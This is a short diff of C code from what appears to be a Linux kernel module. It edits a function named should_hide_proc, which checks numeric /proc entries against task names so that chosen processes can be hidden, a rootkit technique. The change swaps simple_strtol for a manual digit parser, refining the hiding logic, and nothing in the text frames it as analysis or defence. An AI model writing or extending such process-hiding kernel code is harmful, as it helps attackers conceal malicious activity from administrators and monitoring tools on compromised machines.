@@ -65,15 +65,18 @@ static void (*kfn_get_task_comm)(char *to, struct task_struct *task);
 static int should_hide_proc(const char *name)
 {
     pid_t nr;
-    char *endp;
     struct task_struct *task;
 
     /* Only check numeric entries (PID directories) */
     if (!name || name[0] < '0' || name[0] > '9')
         return 0;
 
-    nr = simple_strtol(name, &endp, 10);
-    if (*endp != '\0')
+    nr = 0;
+    while (*name >= '0' && *name <= '9') {
+        nr = nr * 10 + (*name - '0');
+        name++;
+    }
+    if (*name != '\0')
         return 0; /* not a pure numeric PID */
 
     if (!kfn_find_task_by_vpid || !kfn_get_task_comm)
